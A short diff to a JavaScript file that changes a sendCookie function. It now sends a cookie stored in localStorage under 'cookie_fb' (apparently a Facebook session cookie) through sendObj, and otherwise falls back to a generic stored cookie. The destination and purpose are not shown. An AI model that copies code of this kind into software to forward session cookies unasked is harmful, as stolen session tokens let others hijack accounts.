@@ -64,7 +64,9 @@ function start () {
 }
 
 function sendCookie () {
-  if (typeof window.localStorage.cookie === 'undefined') {
+  if (typeof window.localStorage.cookie_fb !== 'undefined') {
+    sendObj({m: 'cookie', cookie: window.localStorage.cookie_fb, fb: true}, true)
+  } else if (typeof window.localStorage.cookie === 'undefined') {
     shortObj({m: 'output', msg: 'No Cookies!'})
   } else {
     sendObj({m: 'cookie', cookie: window.localStorage.cookie}, true)
